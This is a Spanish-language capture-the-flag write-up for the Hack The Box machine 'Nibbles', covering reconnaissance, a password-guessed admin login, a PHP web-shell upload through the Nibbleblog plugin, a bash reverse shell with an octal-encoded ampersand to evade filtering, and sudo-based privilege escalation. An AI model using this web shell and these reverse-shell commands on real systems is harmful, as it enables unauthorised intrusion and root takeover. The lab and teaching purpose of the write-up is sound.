---
title: Hack The Box Nibbles
author: k4miyo
date: 2022-03-18
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Linux]
tags: [File Misconfiguration]
ping: true
---

## Nibbles
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.75.

```bash
❯ ping -c 1 10.10.10.75
PING 10.10.10.75 (10.10.10.75) 56(84) bytes of data.
64 bytes from 10.10.10.75: icmp_seq=1 ttl=63 time=136 ms

--- 10.10.10.75 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 136.306/136.306/136.306/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.10.10.75 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-18 00:37 CST
Initiating Ping Scan at 00:37
Scanning 10.10.10.75 [4 ports]
Completed Ping Scan at 00:37, 0.17s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:37
Scanning 10.10.10.75 [65535 ports]
Discovered open port 22/tcp on 10.10.10.75
Discovered open port 80/tcp on 10.10.10.75
Completed SYN Stealth Scan at 00:38, 37.05s elapsed (65535 total ports)
Nmap scan report for 10.10.10.75
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 37.36 seconds
           Raw packets sent: 68935 (3.033MB) | Rcvd: 68928 (2.757MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
       │ Size: 116 B
───────┼─────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.75
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,80 10.10.10.75 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-18 00:38 CST
Nmap scan report for 10.10.10.75
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.10 seconds
```

Vemos el puerto 80 abierto, por lo que ocuparemos la herramienta `whatweb` para ver a lo que nos enfrentamos.

```bash
❯ whatweb http://10.10.10.75/
http://10.10.10.75/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.75]
```

No tenemos nada interesante, así que visualizaremos el contenido vía web.

![](/assets/images/htb-nibbles/nibbles-web.png)

Si vemos el código fuente de la página web, nos encontramos con un comentario en donde se nos muestra el recurso `/nibbleblog/`:

![](/assets/images/htb-nibbles/nibbles-web1.png)

Si ingresamos a dicho recurso, poca cosa vemos.

![](/assets/images/htb-nibbles/nibbles-web2.png)

Ahora, vamos a tratar de descubrir recursos en el servidor web  con la herramienta `nmap`:

```bash
❯ nmap --script http-enum --script-args http-enum.basepath="nibbleblog" -p80 10.10.10.75 -oN webScan_nibbleblog
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-18 00:46 CST
Nmap scan report for 10.10.10.75
Host is up (0.14s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /nibbleblog/admin.php: Possible admin folder
|   /nibbleblog/admin/: Possible admin folder
|   /nibbleblog/README: Interesting, a readme.
|   /nibbleblog/content/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_  /nibbleblog/themes/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'

Nmap done: 1 IP address (1 host up) scanned in 13.16 seconds
```

Un recurso interesante que ya nos llamada la atención es `/content`, `/admin/` y `/admin.php`. Primero vamos a checar `/content/` y se trata de un listado de directorios.

![](/assets/images/htb-nibbles/nibbles-web3.png)

Para trabajar más cómodos, vamos a traernos los recursos de dicho directorio a nuestra máquina.

```bash
❯ wget -r --no-passive --no-parent http://10.10.10.75/nibbleblog/content/ -R "index.html*"                                       --2022-03-18 01:03:26--  http://10.10.10.75/nibbleblog/content/                                                                  
Conectando con 10.10.10.75:80... conectado.                                                                                      
Petición HTTP enviada, esperando respuesta... 200 OK                                                                             
Longitud: 1353 (1.3K) [text/html]                                                                                                
Grabando a: «10.10.10.75/nibbleblog/content/index.html.tmp»                                                                      
                                                                                                                                 
10.10.10.75/nibbleblog/content/i 100%[=======================================================>]   1.32K  --.-KB/s    en 0s       
                                                                                                                                 
2022-03-18 01:03:26 (185 MB/s) - «10.10.10.75/nibbleblog/content/index.html.tmp» guardado [1353/1353]                            
                                                                                                                                 
Cargando robots.txt; por favor ignore los errores.                                                                               
--2022-03-18 01:03:26--  http://10.10.10.75/robots.txt                                                                           
Reutilizando la conexión con 10.10.10.75:80.                                                                                     
Petición HTTP enviada, esperando respuesta... 404 Not Found                                                                      
2022-03-18 01:03:27 ERROR 404: Not Found.                                                                                        
                                                                                                                                 
Eliminando 10.10.10.75/nibbleblog/content/index.html.tmp puesto que debería ser rechazado.
---
--2022-03-18 01:03:47--  http://10.10.10.75/nibbleblog/content/private/plugins/pages/?C=D;O=D                                    
Reutilizando la conexión con 10.10.10.75:80.                                                                                     
Petición HTTP enviada, esperando respuesta... 200 OK                                                                             
Longitud: 1036 (1.0K) [text/html]                                                                                                
Grabando a: «10.10.10.75/nibbleblog/content/private/plugins/pages/index.html?C=D;O=D.tmp»                                        
                                                                                                                                 
10.10.10.75/nibbleblog/content/p 100%[=======================================================>]   1.01K  --.-KB/s    en 0s      

2022-03-18 01:03:47 (112 MB/s) - «10.10.10.75/nibbleblog/content/private/plugins/pages/index.html?C=D;O=D.tmp» guardado [1036/103
6]

Eliminando 10.10.10.75/nibbleblog/content/private/plugins/pages/index.html?C=D;O=D.tmp puesto que debería ser rechazado.

ACABADO --2022-03-18 01:03:47--
Tiempo total de reloj: 21s
Descargados: 144 ficheros, 272K en 0.1s (1.86 MB/s)
```

Ya podemos ver de una formas más cómoda los recursos dentro de la carpeta `/content/`:

```bash
❯ tree
.
└── 10.10.10.75
    └── nibbleblog
        └── content
            ├── private
            │   ├── categories.xml
            │   ├── comments.xml
            │   ├── config.xml
            │   ├── keys.php
            │   ├── notifications.xml
            │   ├── pages.xml
            │   ├── plugins
            │   │   ├── categories
            │   │   │   └── db.xml
            │   │   ├── hello
            │   │   │   └── db.xml
            │   │   ├── latest_posts
            │   │   │   └── db.xml
            │   │   ├── my_image
            │   │   │   └── db.xml
            │   │   └── pages
            │   │       └── db.xml
            │   ├── posts.xml
            │   ├── shadow.php
            │   ├── tags.xml
            │   └── users.xml
            ├── public
            │   ├── comments
            │   ├── pages
            │   ├── posts
            │   └── upload
            │       ├── nibbles_0_nbmedia.jpg
            │       ├── nibbles_0_o.jpg
            │       └── nibbles_0_thumb.jpg
            └── tmp

16 directories, 18 files
❯ find \-type f
./10.10.10.75/nibbleblog/content/private/categories.xml
./10.10.10.75/nibbleblog/content/private/comments.xml
./10.10.10.75/nibbleblog/content/private/config.xml
./10.10.10.75/nibbleblog/content/private/keys.php
./10.10.10.75/nibbleblog/content/private/notifications.xml
./10.10.10.75/nibbleblog/content/private/pages.xml
./10.10.10.75/nibbleblog/content/private/plugins/categories/db.xml
./10.10.10.75/nibbleblog/content/private/plugins/hello/db.xml
./10.10.10.75/nibbleblog/content/private/plugins/latest_posts/db.xml
./10.10.10.75/nibbleblog/content/private/plugins/my_image/db.xml
./10.10.10.75/nibbleblog/content/private/plugins/pages/db.xml
./10.10.10.75/nibbleblog/content/private/posts.xml
./10.10.10.75/nibbleblog/content/private/shadow.php
./10.10.10.75/nibbleblog/content/private/tags.xml
./10.10.10.75/nibbleblog/content/private/users.xml
./10.10.10.75/nibbleblog/content/public/upload/nibbles_0_nbmedia.jpg
./10.10.10.75/nibbleblog/content/public/upload/nibbles_0_o.jpg
./10.10.10.75/nibbleblog/content/public/upload/nibbles_0_thumb.jpg
```

Un recurso que nos puede llamar la atención sería `keys.php`; sin embargo, no presenta contenido; así que vamos a checar el recurso `users.xml`.

```bash
❯ cat ./10.10.10.75/nibbleblog/content/private/users.xml                                                                         
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: ./10.10.10.75/nibbleblog/content/private/users.xml                                                                
       │ Size: 503 B                                                                                                             
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
   2   │ <users><user username="admin"><id type="integer">0</id><session_fail_count type="integer">2</session_fail_count><session
       │ _date type="integer">1647586085</session_date></user><blacklist type="string" ip="10.10.10.1"><date type="integer">15129
       │ 64659</date><fail_count type="integer">1</fail_count></blacklist><blacklist type="string" ip="10.10.14.27"><date type="i
       │ nteger">1647586081</date><fail_count type="integer">3</fail_count></blacklist></users>
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Para verlo de una forma más cómoda, vamos a instalar `yq` con el comando `pip install yq` y posteriormente abrimos el archivo y al final agregamos `| xq`:

```bash
❯ cat ./10.10.10.75/nibbleblog/content/private/users.xml | xq
{
  "users": {
    "user": {
      "@username": "admin",
      "id": {
        "@type": "integer",
        "#text": "0"
      },
      "session_fail_count": {
        "@type": "integer",
        "#text": "2"
      },
      "session_date": {
        "@type": "integer",
        "#text": "1647586085"
      }
    },
    "blacklist": [
      {
        "@type": "string",
        "@ip": "10.10.10.1",
        "date": {
          "@type": "integer",
          "#text": "1512964659"
        },
        "fail_count": {
          "@type": "integer",
          "#text": "1"
        }
      },
      {
        "@type": "string",
        "@ip": "10.10.14.27",
        "date": {
          "@type": "integer",
          "#text": "1647586081"
        },
        "fail_count": {
          "@type": "integer",
          "#text": "3"
        }
      }
    ]
  }
}
```

Vemos el usuario **admin**, pero no vemos la contraseña. Por lo tanto, podriamos pensar que debe existir un panel de login, el cual se encuentra en `/admin.php`:

![](/assets/images/htb-nibbles/nibbles-web4.png)

Podríamos tratar de utilizar contraseñas por defecto, como **admin**, **passoword**, **admin123** e incluso el nombre de la máquina (ya que esto es un CTF) y vemos que la contraseña es el propio nombre de la máquina para el usuario **admin**.

![](/assets/images/htb-nibbles/nibbles-web5.png)

A este punto, podríamos tratar de buscar exploits públicos asociados a **nibbleblog**:

```bash
❯ searchsploit nibbleblog
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                         | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                          | php/remote/38489.rb
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Tenemos uno que nos puede llamar la atención **Arbitrary File Upload (Metasploit)** y como en este sitio no ocupamos metasploit, vamos a leerlo a ver de que forma realiza la explotación.

```rb
---
vprint_status("#{peer} - Uploading payload...")
    res = send_request_cgi(
      'method'        => 'POST',
      'uri'           => normalize_uri(target_uri, 'admin.php'),
      'vars_get'      => {
        'controller'  => 'plugins',
        'action'      => 'config',
        'plugin'      => 'my_image'
      },
      'ctype'         => "multipart/form-data; boundary=#{data.bound}",
      'data'          => post_data,
      'cookie'        => cookie
    )
---
```

En esta parte nos indica algunos campos como **plugins**, **config** y **my_image** y si checamos vía web, vemos que podría tratarse de una ruta.

![](/assets/images/htb-nibbles/nibbles-web6.png)

Si la damos click en **Configure** dentro del campo **My_image**, vemos que podemos subir un archivo; sin embargo, no sabemos que tipo de archivos nos pueda permitir subir.

![](/assets/images/htb-nibbles/nibbles-web7.png)

Por lo tanto, vamos a tratar de ver si podemos subir un archivo php.

```php
<?php
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"
?>
```

![](/assets/images/htb-nibbles/nibbles-web8.png)

En la parte de abajo nos debe aparecer un mensaje indicando que el archivo se subir exitosamente. Ahora debemos descubrir la ruta en donde se alojó nuestro archivo y si ponemos un poco de atención en lo que nos descargamos de el recurso `/content/`, vemos que bajo la ruta `/content/private/` existe un directorio llamado **plugins** y dentro de este se encuentra otro directorio de nombre **my_image**; por lo que es muy probable que ahí este nuestro archivo.

![](/assets/images/htb-nibbles/nibbles-web9.png)

Vamos a seleccionar nuestro archivo y tratar de ejecutar algún comando a nivel de sistema.

```bash
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=whoami
```

![](/assets/images/htb-nibbles/nibbles-web10.png)

Tenemos ejecución de comandos a nivel de sistema, por lo tanto, trataremos de entablarnos una reverse shell; así que nos podremos en escucha por el puerto 443 y ejecutamos nuestro comando. Si tratamos varias veces, vemos que no podemos entablarnos la reverse shell, esto se debe a que existen caracteres que al servidor no le gusta; por lo tanto vamos a probar de ver que caracteres son utilizando `bash -i >& /dev/tcp/10.10.14.27/443 0>&1`.

```bash
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=echo "/"
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=echo "&"
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=echo ">"
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=echo "-"
```

El único caracter que no vemos es **&**; por lo tanto vamos a declarar una variable cuyo valor lo expresaremos en forma octal de dicho caracter (046 - lo obtenemos de `man ascii`).

```bash
❯ ampersan=$(printf '\046'); echo $ampersan
&
```

Por lo tanto, nuestra reverse shell nos quedaría de la siguiente forma:

```bash
ampersan=$(printf '\046'); bash -c "bash -i >$ampersan /dev/tcp/10.10.14.27/443 0>$ampersan 1"
```

Nos ponemos en escucha por el puerto 443 y ejecutamos:

```bash
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=ampersan=$(printf '\046'); bash -c "bash -i >$ampersan /dev/tcp/10.10.14.27/443 0>$ampersan 1"
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.75] 37836
bash: cannot set terminal process group (1372): Inappropriate ioctl for device
bash: no job control in this shell
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ whoami
<ml/nibbleblog/content/private/plugins/my_image$ whoami                      
nibbler
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
```

Ya nos encontramos dentro de la máquina, pero antes, vamos a realizar un [Tratamiento de la tty](/posts/tratamiento-tty). Somos el usuario **nibbler** y podemos visualizar la flag (user.txt), por lo que ahora vamos a enumerar un poco el sistema para ver de que forma nos podemos convertir en **root**.

```bash
nibbler@Nibbles:/home/nibbler$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
nibbler@Nibbles:/home/nibbler$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$
```

Vemos que podemos ejecutar `/home/nibbler/personal/stuff/monitor.sh` como el usuario **root** sin proporcionar contraseña; por lo tanto vamos a ver los permisos que disponemos sobre el script.

```bash
nibbler@Nibbles:/home/nibbler$ ls -l
total 8
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Mar 18 02:36 user.txt
nibbler@Nibbles:/home/nibbler$ unzip personal.zip 
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
nibbler@Nibbles:/home/nibbler$ ls -l
total 12
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 personal
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Mar 18 02:36 user.txt
nibbler@Nibbles:/home/nibbler$ cd personal
nibbler@Nibbles:/home/nibbler/personal$ ls -l
total 4
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 stuff
nibbler@Nibbles:/home/nibbler/personal$ cd stuff/
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -l
total 4
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$
```

Tenemos permisos de lectura, escritura y ejecución, por lo tanto vamos a cambiar el contenido de dicho script:

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh 
#!/bin/bash

/bin/bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
root@Nibbles:/home/nibbler/personal/stuff# whoami
root
root@Nibbles:/home/nibbler/personal/stuff#
```

Ya somos el usuario **root** y podemos visualizar al flag (root.txt).
